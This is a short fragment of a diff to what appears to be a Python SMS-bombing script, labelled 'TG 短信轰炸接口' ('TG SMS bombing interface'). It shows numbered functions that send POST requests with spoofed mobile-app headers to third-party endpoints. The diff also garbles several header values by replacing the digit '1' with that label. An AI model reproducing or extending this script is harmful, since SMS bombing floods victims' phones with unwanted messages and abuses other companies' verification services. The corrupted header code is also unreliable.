+        "type": "TG 短信轰炸接口"
     }
 
     response142 = requests.post(url142, headers=headers142, json=data142)
@@ -2423,10 +2423,10 @@ def request_url143():
         "Accept": "*/*",
         "Connection": "keep-alive",
         "Content-Length": "44",
-        "User-Agent": "GGTravelGuide/1.2.8 (com.TravelGuide.success; build:1; iOS 16.6.1) Alamofire/5.7.1",
-        "Accept-Language": "zh-Hans-CN;q=1.0",
+        "User-Agent": "GGTravelGuide/TG 短信轰炸接口.2.8 (com.TravelGuide.success; build:TG 短信轰炸接口; iOS 16.6.TG 短信轰炸接口) Alamofire/5.7.TG 短信轰炸接口",
+        "Accept-Language": "zh-Hans-CN;q=TG 短信轰炸接口.0",
         "Authorization": "Bearer noToken",
-        "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8"
+        "Accept-Encoding": "br;q=TG 短信轰炸接口.0, gzip;q=0.9, deflate;q=0.8"
     }
 
     data143 = {
